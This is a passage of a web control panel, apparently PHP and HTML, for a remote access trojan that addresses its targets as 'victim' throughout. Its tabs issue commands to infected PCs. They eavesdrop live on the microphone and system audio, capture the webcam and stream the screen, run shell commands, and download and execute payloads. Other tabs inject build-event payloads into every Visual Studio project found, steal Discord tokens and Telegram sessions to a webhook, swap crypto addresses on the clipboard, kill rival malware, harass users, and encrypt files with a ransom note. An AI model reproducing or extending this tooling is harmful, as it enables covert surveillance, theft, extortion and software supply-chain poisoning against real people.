                                 onclick="window.open(this.src, '_blank')"
                                 alt="Screenshot">
                            <p style="color: #aaa; font-size: 0.9em; margin-top: 10px;">
                                📌 Click image to open in new tab | Right-click to save
                            </p>
                        </div>
                        <?php else: ?>
                        <div style="text-align: center; padding: 40px; color: #aaa; background: #0a0e27; border-radius: 5px;">
                            <p>No screenshots taken yet</p>
                            <p style="font-size: 0.9em; margin-top: 10px;">Click "Take Screenshot" to capture the screen</p>
                        </div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="result-box" id="result-screenshot">Results will appear here...</div>
                </div>
            </div>
            
            <!-- MICROPHONE TAB -->
            <div id="tab-microphone" class="tab-content">
                <div class="card">
                    <h2>🎤 Microphone Recording</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-danger" id="liveListenBtn" onclick="toggleLiveAudio()">🎧 Start Live Listen</button>
                        <button class="btn btn-success" onclick="sendCommand('media:microphone', $val('mic_duration'))">🔴 Record & Upload</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Recording Duration (seconds)</label>
                        <input type="number" id="mic_duration" value="5" min="1" max="60">
                    </div>
                    
                    <div id="liveAudioControls" style="display: none; margin-top: 15px; padding: 15px; background: #1a2332; border-radius: 5px; border: 2px solid #ff6b6b;">
                        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 10px;">
                            <span style="color: #ff6b6b; font-weight: bold;">🔴 LIVE</span>
                            <span id="liveTimer" style="color: #ffd93d;">00:00</span>
                            <div style="flex: 1; height: 30px; background: #0a0e27; border-radius: 3px; overflow: hidden; position: relative;">
                                <canvas id="audioVisualizer" style="width: 100%; height: 100%;"></canvas>
                            </div>
                        </div>
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <label style="color: #aaa;">Volume:</label>
                            <input type="range" id="liveVolume" min="0" max="100" value="80" style="flex: 1;" oninput="updateLiveVolume(this.value)">
                            <span id="volumeLabel" style="color: #51cf66; min-width: 40px;">80%</span>
                        </div>
                        <div style="margin-top: 10px; color: #aaa; font-size: 0.9em;">
                            📡 Streaming audio from client in real-time...
                        </div>
                    </div>
                    
                    <div class="result-box" id="result-microphone">Results will appear here...</div>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #1a2332; border-radius: 5px; color: #aaa; font-size: 0.9em;">
                        <p>🎧 <strong>Live Listen:</strong> Stream microphone audio in real-time (continuous)</p>
                        <p>🔴 <strong>Record & Upload:</strong> Record for X seconds and upload to webhook</p>
                    </div>
                </div>
                
                <audio id="liveAudioPlayer" style="display: none;"></audio>
            </div>
            
            <!-- SYSTEM AUDIO TAB -->
            <div id="tab-systemaudio" class="tab-content">
                <div class="card">
                    <h2>🔊 System Audio Recording</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-danger" id="liveSystemAudioBtn" onclick="toggleLiveSystemAudio()">🎧 Start Live Listen</button>
                        <button class="btn btn-success" onclick="sendCommand('media:systemaudio', $val('audio_duration'))">🔴 Record & Upload</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Recording Duration (seconds)</label>
                        <input type="number" id="audio_duration" value="5" min="1" max="60">
                    </div>
                    
                    <div id="liveSystemAudioControls" style="display: none; margin-top: 15px; padding: 15px; background: #1a2332; border-radius: 5px; border: 2px solid #ff6b6b;">
                        <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 10px;">
                            <span style="color: #ff6b6b; font-weight: bold;">🔴 LIVE</span>
                            <span id="liveSystemTimer" style="color: #ffd93d;">00:00</span>
                            <div style="flex: 1; height: 30px; background: #0a0e27; border-radius: 3px; overflow: hidden; position: relative;">
                                <canvas id="systemAudioVisualizer" style="width: 100%; height: 100%;"></canvas>
                            </div>
                        </div>
                        <div style="display: flex; gap: 10px; align-items: center;">
                            <label style="color: #aaa;">Volume:</label>
                            <input type="range" id="liveSystemVolume" min="0" max="100" value="80" style="flex: 1;" oninput="updateLiveSystemVolume(this.value)">
                            <span id="systemVolumeLabel" style="color: #51cf66; min-width: 40px;">80%</span>
                        </div>
                        <div style="margin-top: 10px; color: #aaa; font-size: 0.9em;">
                            📡 Streaming system audio (speakers/headphones) in real-time...
                        </div>
                    </div>
                    
                    <div class="result-box" id="result-systemaudio">Results will appear here...</div>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #1a2332; border-radius: 5px; color: #aaa; font-size: 0.9em;">
                        <p>🎧 <strong>Live Listen:</strong> Stream system audio in real-time (continuous)</p>
                        <p>🔴 <strong>Record & Upload:</strong> Record for X seconds and upload to webhook</p>
                        <p>📌 <strong>System Audio</strong> captures what the victim hears (music, videos, calls, notifications)</p>
                        <p>📌 Uses loopback recording from speakers/headphones output</p>
                    </div>
                </div>
                
                <audio id="liveSystemAudioPlayer" style="display: none;"></audio>
            </div>
            
            <!-- WEBCAM TAB -->
            <div id="tab-webcam" class="tab-content">
                <div class="card">
                    <h2>📷 Webcam Capture</h2>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('media:webcam', '')">📸 Take Photo</button>
                        <button class="btn btn-danger" onclick="sendCommand('media:webcamvideo', '10')">🎥 Record Video (10s)</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Video Duration (seconds)</label>
                        <input type="number" id="video_duration" value="10" min="1" max="60">
                        <button class="btn" onclick="sendCommand('media:webcamvideo', $val('video_duration'))">🎥 Record Custom Duration</button>
                    </div>
                    
                    <div class="result-box" id="result-webcam">Results will appear here...</div>
                    
                    <div style="margin-top: 15px; padding: 10px; background: #1a2332; border-radius: 5px; color: #aaa; font-size: 0.9em;">
                        <p>📌 Photos saved as BMP (640x480)</p>
                        <p>📌 Videos saved as AVI (640x480 @ 15fps)</p>
                        <p>📌 Files saved to victim's temp folder</p>
                    </div>
                </div>
            </div>
            
            <!-- SHELL COMMANDS TAB -->
            <div id="tab-shell" class="tab-content">
                <div class="card">
                    <h2>💻 Shell Commands</h2>
                    
                    <div class="form-group">
                        <label>Execute Shell Command</label>
                        <textarea id="shell_command" placeholder="dir C:\ or whoami"></textarea>
                        <button class="btn" onclick="sendCommand('shell', $val('shell_command'))">Execute</button>
                    </div>
                    
                    <button class="btn" onclick="sendCommand('sysinfo', '')">Get System Info</button>
                    
                    <div class="result-box" id="result-shell">Results will appear here...</div>
                </div>
            </div>
            
            <!-- WALLPAPER TAB -->
            <div id="tab-wallpaper" class="tab-content">
                <div class="card">
                    <h2>🖼️ Wallpaper Changer</h2>
                    
                    <div class="form-group">
                        <label>Image/Video URL (PNG, JPG, GIF, BMP, MP4)</label>
                        <input type="text" id="wallpaper_url" placeholder="https://example.com/image.png">
                        <button class="btn" onclick="sendCommand('wallpaper', $val('wallpaper_url'))">Change Wallpaper</button>
                    </div>
                    
                    <div class="result-box" id="result-wallpaper">Results will appear here...</div>
                </div>
            </div>
            
            <!-- INJECT .VCXPROJ TAB -->
            <div id="tab-projects" class="tab-content">
                <div class="card">
                    <h2>💉 Inject .vcxproj Files</h2>
                    
                    <div class="form-group">
                        <label>Payload Download URL</label>
                        <input type="text" id="project_url" placeholder="https://example.com/malware.exe">
                        <button class="btn btn-warning" onclick="sendCommand('findprojects', $val('project_url'))">Scan ALL Drives & Inject</button>
                    </div>
                    
                    <p style="color: #ffd93d; margin: 10px 0;">⚠️ This will scan C:, D:, E:, etc. and inject PostBuildEvent into every .vcxproj found!</p>
                    
                    <div class="result-box" id="result-projects">Results will appear here...</div>
                </div>
            </div>
            
            <!-- DOWNLOAD & EXECUTE TAB -->
            <div id="tab-download" class="tab-content">
                <div class="card">
                    <h2>⬇️ Download & Execute</h2>
                    
                    <div class="form-group">
                        <label>File URL</label>
                        <input type="text" id="download_url" placeholder="https://example.com/file.exe">
                        <button class="btn btn-warning" onclick="sendCommand('download_exec', $val('download_url'))">Download & Execute</button>
                    </div>
                    
                    <div class="result-box" id="result-download">Results will appear here...</div>
                </div>
            </div>
            
            <!-- ADVANCED THEFT TAB -->
            <div id="tab-theft" class="tab-content">
                <div class="card">
                    <h2>🎯 Advanced Data Theft</h2>
                    <p style="color: #aaa; margin-bottom: 15px;">
                        ⚠️ Auto-sends to Discord webhook when found!
                    </p>
                    
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('theft:discord', '')">🎮 Steal Discord Tokens</button>
                        <button class="btn btn-success" onclick="sendCommand('theft:telegram', '')">📱 Steal Telegram Sessions</button>
                    </div>
                    
                    <div style="background: #0a0e27; padding: 15px; border-radius: 5px; margin-top: 15px;">
                        <p style="color: #51cf66; margin-bottom: 10px;">✅ Discord Auto-Exfil Enabled</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            When Discord tokens or Telegram sessions are found, they will be automatically 
                            sent to your Discord webhook in real-time! Check your Discord channel for notifications.
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-theft">Results will appear here...</div>
                </div>
            </div>
            
            <!-- CRYPTO CLIPPER TAB -->
            <div id="tab-clipper" class="tab-content">
                <div class="card">
                    <h2>💰 Cryptocurrency Clipper</h2>
                    
                    <div class="form-group">
                        <label>Start Clipper (format: BTC|ETH|LTC)</label>
                        <input type="text" id="clipper_btc" placeholder="Your Bitcoin Address" style="margin-bottom: 10px;">
                        <input type="text" id="clipper_eth" placeholder="Your Ethereum Address" style="margin-bottom: 10px;">
                        <input type="text" id="clipper_ltc" placeholder="Your Litecoin Address">
                        <button class="btn btn-success" onclick="sendCommand('clipper:start', $val('clipper_btc') + '|' + $val('clipper_eth') + '|' + $val('clipper_ltc'))">🚀 Start Clipper</button>
                    </div>
                    
                    <div class="btn-grid">
                        <button class="btn btn-danger" onclick="sendCommand('clipper:stop', '')">Stop Clipper</button>
                        <button class="btn" onclick="sendCommand('clipper:status', '')">Check Status</button>
                    </div>
                    
                    <div style="background: #0a0e27; padding: 15px; border-radius: 5px; margin-top: 15px;">
                        <p style="color: #ffd93d; margin-bottom: 10px;">ℹ️ How It Works</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            Monitors clipboard for crypto addresses and replaces them with yours. 
                            When victim copies a wallet address and pastes it, your address is used instead!
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-clipper">Results will appear here...</div>
                </div>
            </div>
            
            <!-- BOT KILLER TAB -->
            <div id="tab-botkiller" class="tab-content">
                <div class="card">
                    <h2>⚔️ Bot Killer</h2>
                    <p style="color: #aaa; margin-bottom: 15px;">
                        Terminate competing RATs and malware on the victim PC
                    </p>
                    
                    <div class="btn-grid">
                        <button class="btn btn-danger" onclick="sendCommand('botkiller:scan', '')">🔍 Scan & Kill Bots</button>
                        <button class="btn" onclick="sendCommand('botkiller:list', '')">📋 View Kill List</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Add Custom Bot to Kill List</label>
                        <input type="text" id="botkiller_add" placeholder="process_name.exe">
                        <button class="btn" onclick="sendCommand('botkiller:add', $val('botkiller_add'))">Add to List</button>
                    </div>
                    
                    <div style="background: #0a0e27; padding: 15px; border-radius: 5px; margin-top: 15px;">
                        <p style="color: #ff6b6b; margin-bottom: 10px;">⚡ Targets 30+ Known RATs</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            XWorm, njRAT, AsyncRAT, Quasar, DarkComet, CyberGate, Remcos, NetWire, 
                            Imminent, Orcus, XMRig, CPUMiner, Redline, Vidar, Raccoon, and more!
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-botkiller">Results will appear here...</div>
                </div>
            </div>
            
            <!-- REMOTE CONTROL TAB -->
            <div id="tab-remotecontrol" class="tab-content">
                <div class="card">
                    <h2>🎮 Remote PC Control</h2>
                    <p style="color: #6bcf7f; margin-bottom: 20px;">Control the victim's mouse and keyboard remotely</p>
                    
                    <!-- Mouse Control -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🖱️ Mouse Control</h3>
                    
                    <div class="form-group">
                        <label>Move Mouse to Position</label>
                        <div style="display: flex; gap: 10px;">
                            <input type="number" id="mouse_x" placeholder="X coordinate" value="500" style="flex: 1;">
                            <input type="number" id="mouse_y" placeholder="Y coordinate" value="500" style="flex: 1;">
                            <button class="btn" onclick="sendCommand('rc:movemouse', $val('mouse_x') + ',' + $val('mouse_y'))">Move Mouse</button>
                        </div>
                    </div>
                    
                    <div class="btn-grid">
                        <button class="btn" onclick="sendCommand('rc:click', 'left')">🖱️ Left Click</button>
                        <button class="btn" onclick="sendCommand('rc:click', 'right')">🖱️ Right Click</button>
                        <button class="btn" onclick="sendCommand('rc:click', 'double')">🖱️ Double Click</button>
                        <button class="btn" onclick="sendCommand('rc:mousepos', '')">📍 Get Position</button>
                    </div>
                    
                    <!-- Keyboard Control -->
                    <h3 style="color: #3282b8; margin-top: 20px;">⌨️ Keyboard Control</h3>
                    
                    <div class="form-group">
                        <label>Type Text</label>
                        <input type="text" id="type_text" placeholder="Hello World!" style="width: 70%; display: inline-block;">
                        <button class="btn" onclick="sendCommand('rc:type', $val('type_text'))" style="width: 28%; margin-left: 2%;">Type</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Press Single Key</label>
                        <input type="text" id="press_key" placeholder="enter, tab, escape, f5, etc." style="width: 70%; display: inline-block;">
                        <button class="btn" onclick="sendCommand('rc:presskey', $val('press_key'))" style="width: 28%; margin-left: 2%;">Press</button>
                    </div>
                    
                    <!-- Common Keys -->
                    <div style="background: #0a0e27; padding: 15px; border-radius: 5px; margin: 15px 0;">
                        <p style="color: #6bcf7f; margin-bottom: 10px; font-weight: bold;">⚡ Quick Keys</p>
                        <div class="button-grid" style="grid-template-columns: repeat(6, 1fr);">
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'enter')">↵ Enter</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'tab')">⇥ Tab</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'space')">␣ Space</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'backspace')">⌫ Back</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'delete')">⌦ Del</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'escape')">⎋ Esc</button>
                        </div>
                        <div class="button-grid" style="grid-template-columns: repeat(4, 1fr); margin-top: 10px;">
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'up')">⬆ Up</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'down')">⬇ Down</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'left')">⬅ Left</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:presskey', 'right')">➡ Right</button>
                        </div>
                    </div>
                    
                    <!-- Keyboard Shortcuts -->
                    <h3 style="color: #3282b8; margin-top: 20px;">⌨️ Keyboard Shortcuts</h3>
                    
                    <div class="form-group">
                        <label>Custom Combo (e.g., ctrl+c, alt+f4, win+r)</label>
                        <input type="text" id="key_combo" placeholder="ctrl+c" style="width: 70%; display: inline-block;">
                        <button class="btn" onclick="sendCommand('rc:combo', $val('key_combo'))" style="width: 28%; margin-left: 2%;">Execute</button>
                    </div>
                    
                    <div style="background: #0a0e27; padding: 15px; border-radius: 5px; margin: 15px 0;">
                        <p style="color: #6bcf7f; margin-bottom: 10px; font-weight: bold;">🔥 Common Combos</p>
                        <div class="button-grid" style="grid-template-columns: repeat(4, 1fr);">
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+c')">📋 Copy</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+v')">📝 Paste</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+x')">✂️ Cut</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+z')">⎌ Undo</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+a')">🔲 Select All</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+s')">💾 Save</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'alt+f4')">❌ Close Window</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'alt+tab')">🗗 Switch Window</button>
                        </div>
                        <div class="button-grid" style="grid-template-columns: repeat(4, 1fr); margin-top: 10px;">
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'win+r')">🏃 Run Dialog</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'win+d')">🖥️ Show Desktop</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'win+e')">📁 Explorer</button>
                            <button class="btn btn-sm" onclick="sendCommand('rc:combo', 'ctrl+shift+escape')">⚙️ Task Manager</button>
                        </div>
                    </div>
                    
                    <!-- Advanced Actions -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🚀 Advanced Actions</h3>
                    
                    <div class="button-grid">
                        <button class="btn btn-success" onclick="openURL()">🌐 Open URL</button>
                        <button class="btn btn-success" onclick="runProgram()">▶️ Run Program</button>
                        <button class="btn btn-danger" onclick="lockScreen()">🔒 Lock Screen</button>
                        <button class="btn btn-danger" onclick="logoutUser()">👋 Logout User</button>
                    </div>
                    
                    <!-- Interactive Canvas (for future click-to-control) -->
                    <div style="background: #0a0e27; padding: 15px; border-radius: 5px; margin: 15px 0;">
                        <p style="color: #ff6b6b; margin-bottom: 10px;">💡 Pro Tip</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            Use the <strong>Surveillance</strong> tab to take screenshots, then use the coordinates from the image 
                            to control the mouse precisely. Example: See button at X=500, Y=300 → Move mouse there → Click!
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-remotecontrol">Results will appear here...</div>
                </div>
            </div>
            
            <!-- TROLLING COMMANDS TAB -->
            <div id="tab-trolling" class="tab-content">
                <div class="card">
                    <h2>😈 Trolling Commands</h2>
                    <p style="color: #ff6b6b; margin-bottom: 20px;">⚠️ Fun chaos commands! Use responsibly.</p>
                    
                    <!-- Screen Manipulation -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🔄 Screen Manipulation</h3>
                    <div class="button-grid">
                        <button class="btn btn-troll" onclick="sendCommand('troll:flipscreen', 'upsidedown')">🙃 Flip Upside Down</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:flipscreen', 'left')">↪️ Rotate Left</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:flipscreen', 'right')">↩️ Rotate Right</button>
                        <button class="btn btn-success" onclick="sendCommand('troll:flipscreen', 'normal')">✅ Fix Screen</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:blinkscreen', '10')">💫 Blink Screen 10x</button>
                    </div>
                    
                    <!-- Mouse/Keyboard Chaos -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🖱️ Input Chaos</h3>
                    <div class="button-grid">
                        <button class="btn btn-troll" onclick="sendCommand('troll:crazymouse', '10')">🐭 Crazy Mouse 10s</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:blockkeyboard', '5')">⌨️ Block Keyboard 5s</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:blockmouse', '10')">🖱️ Block Mouse 10s</button>
                    </div>
                    
                    <!-- Message Spam -->
                    <h3 style="color: #3282b8; margin-top: 20px;">💬 Message Trolling</h3>
                    <div class="form-group">
                        <label>Type Message:</label>
                        <input type="text" id="type-message-input" placeholder="Enter message to type..." value="You have been hacked!">
                        <button class="btn btn-troll" onclick="sendCommand('troll:typemessage', $val('type-message-input'))">⌨️ Type Message</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Spam Message Boxes (format: count|title|message):</label>
                        <input type="text" id="msgbox-input" placeholder="10|Warning|Your PC has been hacked!" value="10|Warning|Your PC has been hacked!">
                        <button class="btn btn-troll" onclick="sendCommand('troll:spammsgbox', $val('msgbox-input'))">📢 Spam Message Boxes</button>
                    </div>
                    
                    <!-- Audio Trolling -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🔊 Audio Chaos</h3>
                    <div class="button-grid">
                        <button class="btn btn-troll" onclick="sendCommand('troll:spamsounds', '10')">🔔 Spam Sounds 10s</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:spamcdtray', '10')">💿 Spam CD Tray 10x</button>
                    </div>
                    
                    <!-- Window Manipulation -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🪟 Window Chaos</h3>
                    <div class="button-grid">
                        <button class="btn btn-danger" onclick="if(confirm('This will hide ALL windows!')) sendCommand('troll:hideallwindows', '')">👻 Hide All Windows</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:minimizespam', '10')">📉 Minimize Spam 10x</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:renamewindows', 'FBI - COMPUTER SEIZED')">🏛️ Rename Windows</button>
                    </div>
                    
                    <!-- Application Spam -->
                    <h3 style="color: #3282b8; margin-top: 20px;">📱 Application Spam</h3>
                    <div class="button-grid">
                        <button class="btn btn-troll" onclick="sendCommand('troll:spamcalc', '10')">🔢 Spam Calculator</button>
                        <button class="btn btn-troll" onclick="sendCommand('troll:spamnotepad', '10')">📝 Spam Notepad</button>
                    </div>
                    
                    <!-- Ultimate Trolls -->
                    <h3 style="color: #3282b8; margin-top: 20px;">🎭 Ultimate Trolls</h3>
                    <div class="button-grid">
                        <button class="btn btn-danger" onclick="if(confirm('Show fake Windows Update for 30 seconds?')) sendCommand('troll:fakeupdate', '')">💻 Fake Windows Update</button>
                    </div>
                    
                    <!-- Combo Attacks -->
                    <h3 style="color: #3282b8; margin-top: 20px;">💥 Combo Attacks</h3>
                    <div class="button-grid">
                        <button class="btn btn-danger" onclick="runComboFBI()">🏛️ FBI Combo</button>
                        <button class="btn btn-danger" onclick="runComboChaos()">🔥 Complete Chaos</button>
                        <button class="btn btn-danger" onclick="runComboAnnoy()">😠 Annoying Combo</button>
                    </div>
                    
                    <div class="result-box" id="result-trolling">Results will appear here...</div>
                </div>
            </div>
            
            <!-- FILE EXPLORER+ TAB -->
            <div id="tab-fileexplorer" class="tab-content">
                <div class="card">
                    <h2>📦 Advanced File Explorer</h2>
                    <p style="color: #6bcf7f; margin-bottom: 20px;">Upload, download, and manipulate files with advanced features</p>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">📤 Upload File (from victim PC)</h3>
                    <div class="form-group">
                        <label>File Path to Upload</label>
                        <input type="text" id="fe_upload_path" placeholder="C:\Users\User\Documents\file.txt">
                        <button class="btn" onclick="sendCommand('fe:upload', $val('fe_upload_path'))">Upload File (Get Base64)</button>
                        <p style="color: #aaa; font-size: 0.85em; margin-top: 5px;">
                            💡 This will encode the file to base64 and display it below
                        </p>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">📥 Download File (to victim PC)</h3>
                    <div class="form-group">
                        <label>URL to Download</label>
                        <input type="text" id="fe_download_url" placeholder="https://example.com/file.exe">
                        <label style="margin-top: 10px;">Save to Path</label>
                        <input type="text" id="fe_download_save" placeholder="C:\Users\User\Downloads\file.exe">
                        <button class="btn" onclick="sendCommand('fe:download', $val('fe_download_url') + '|' + $val('fe_download_save'))">Download File</button>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">📝 Write Base64 to File</h3>
                    <div class="form-group">
                        <label>File Path</label>
                        <input type="text" id="fe_write_path" placeholder="C:\Users\User\file.txt">
                        <label style="margin-top: 10px;">Base64 Data</label>
                        <textarea id="fe_write_base64" placeholder="SGVsbG8gV29ybGQh"></textarea>
                        <button class="btn" onclick="sendCommand('fe:writebase64', $val('fe_write_path') + '|' + $val('fe_write_base64'))">Write File</button>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">🔍 Advanced Tools</h3>
                    <div class="form-group">
                        <label>File Path for Tools</label>
                        <input type="text" id="fe_tools_path" placeholder="C:\file.exe">
                        <div class="btn-grid">
                            <button class="btn" onclick="sendCommand('fe:hexdump', $val('fe_tools_path'))">📊 Hex Dump</button>
                            <button class="btn" onclick="sendCommand('fe:checksum', $val('fe_tools_path'))">🔢 Checksum</button>
                            <button class="btn" onclick="sendCommand('fe:compress', $val('fe_tools_path'))">📦 Compress (XOR)</button>
                            <button class="btn" onclick="sendCommand('fe:copypathclipboard', $val('fe_tools_path'))">📋 Copy Path</button>
                        </div>
                    </div>
                    
                    <div class="result-box" id="result-fileexplorer">Results will appear here...</div>
                </div>
            </div>
            
            <!-- LIVE SCREEN VIEWER TAB -->
            <div id="tab-livescreen" class="tab-content">
                <div class="card">
                    <h2>📺 Live Screen Viewer</h2>
                    <p style="color: #6bcf7f; margin-bottom: 20px;">Stream victim's screen in real-time (1-10 FPS)</p>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">⚡ Stream Control</h3>
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('lsv:start', '2')">▶️ Start Streaming (2 FPS)</button>
                        <button class="btn btn-success" onclick="sendCommand('lsv:start', '5')">▶️ Start Streaming (5 FPS)</button>
                        <button class="btn btn-danger" onclick="sendCommand('lsv:stop', '')">⏹️ Stop Streaming</button>
                        <button class="btn" onclick="sendCommand('lsv:status', '')">ℹ️ Status</button>
                    </div>
                    
                    <div class="form-group">
                        <label>Custom FPS (1-10)</label>
                        <input type="number" id="lsv_fps" placeholder="2" min="1" max="10" value="2">
                        <button class="btn" onclick="sendCommand('lsv:start', $val('lsv_fps'))">Start with Custom FPS</button>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">📸 Get Frame</h3>
                    <div class="btn-grid">
                        <button class="btn btn-success" onclick="sendCommand('lsv:getframe', '')">🖼️ Get Latest Frame</button>
                        <button class="btn" onclick="sendCommand('lsv:screenshot', '80')">📷 Single Screenshot (80%)</button>
                        <button class="btn" onclick="sendCommand('lsv:screenshot', '50')">📷 Single Screenshot (50%)</button>
                    </div>
                    
                    <div style="background: rgba(10, 14, 39, 0.6); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid rgba(255, 217, 61, 0.3);">
                        <p style="color: #ffd93d; margin-bottom: 10px; font-weight: bold;">💡 How It Works</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            1. Click "Start Streaming" to begin capturing<br>
                            2. Click "Get Latest Frame" repeatedly to see updates<br>
                            3. Lower FPS = less network/CPU usage<br>
                            4. Base64 images can be decoded at: data:image/jpeg;base64,[DATA]
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-livescreen">Results will appear here...</div>
                </div>
            </div>
            
            <!-- RANSOMWARE TAB -->
            <div id="tab-ransomware" class="tab-content">
                <div class="card">
                    <h2>🔒 Ransomware Module</h2>
                    <p style="color: #ff6b6b; margin-bottom: 20px;">⚠️ EXTREME CAUTION: Encrypts/decrypts files on victim PC</p>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">🔐 Encrypt Directory</h3>
                    <div class="form-group">
                        <label>Directory Path</label>
                        <input type="text" id="ransom_encrypt_path" placeholder="C:\Users\User\Documents">
                        <div class="two-col">
                            <button class="btn btn-danger" onclick="if(confirm('ENCRYPT FILES? This cannot be easily reversed!')) sendCommand('ransom:encrypt', $val('ransom_encrypt_path') + '|true')">🔒 Encrypt (Recursive)</button>
                            <button class="btn btn-danger" onclick="if(confirm('ENCRYPT FILES? This cannot be easily reversed!')) sendCommand('ransom:encrypt', $val('ransom_encrypt_path') + '|false')">🔒 Encrypt (This Folder Only)</button>
                        </div>
                        <p style="color: #aaa; font-size: 0.85em; margin-top: 5px;">
                            💡 Encrypts 40+ file types (.txt, .doc, .pdf, .jpg, .zip, etc.)<br>
                            Files get .locked extension and ransom note is created
                        </p>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">🔓 Decrypt Directory</h3>
                    <div class="form-group">
                        <label>Directory Path</label>
                        <input type="text" id="ransom_decrypt_path" placeholder="C:\Users\User\Documents">
                        <div class="two-col">
                            <button class="btn btn-success" onclick="sendCommand('ransom:decrypt', $val('ransom_decrypt_path') + '|true')">🔓 Decrypt (Recursive)</button>
                            <button class="btn btn-success" onclick="sendCommand('ransom:decrypt', $val('ransom_decrypt_path') + '|false')">🔓 Decrypt (This Folder Only)</button>
                        </div>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">📊 Check Status</h3>
                    <div class="form-group">
                        <label>Directory Path</label>
                        <input type="text" id="ransom_status_path" placeholder="C:\Users\User\Documents">
                        <button class="btn" onclick="sendCommand('ransom:status', $val('ransom_status_path'))">📊 Get Status</button>
                    </div>
                    
                    <div style="background: rgba(255, 107, 107, 0.2); padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid rgba(255, 107, 107, 0.4);">
                        <p style="color: #ff6b6b; margin-bottom: 10px; font-weight: bold;">⚠️ WARNING</p>
                        <p style="color: #aaa; font-size: 0.9em;">
                            • Encryption uses XOR cipher (reversible with same key)<br>
                            • Files are renamed with .locked extension<br>
                            • Ransom note (README_DECRYPT.txt) is created<br>
                            • Use decrypt function to restore files<br>
                            • Test on non-critical files first!
                        </p>
                    </div>
                    
                    <div class="result-box" id="result-ransomware">Results will appear here...</div>
                </div>
            </div>
            
            <!-- WEBSITE OPENER TAB -->
            <div id="tab-website" class="tab-content">
                <div class="card">
                    <h2>🌐 Website Opener</h2>
                    <p style="color: #6bcf7f; margin-bottom: 20px;">Open websites in victim's default browser</p>
                    
                    <div class="form-group">
                        <label>URL to Open</label>
                        <input type="text" id="website_url" placeholder="https://example.com" value="https://google.com">
                        <button class="btn btn-success" onclick="sendCommand('sc:openwebsite', $val('website_url'))">🌐 Open Website</button>
                    </div>
                    
                    <h3 style="color: #3282b8; margin-top: 20px;">🔥 Quick Links</h3>
                    <div class="button-grid">
                        <button class="btn" onclick="sendCommand('sc:openwebsite', 'https://google.com')">Google</button>
                        <button class="btn" onclick="sendCommand('sc:openwebsite', 'https://youtube.com')">YouTube</button>
                        <button class="btn" onclick="sendCommand('sc:openwebsite', 'https://facebook.com')">Facebook</button>
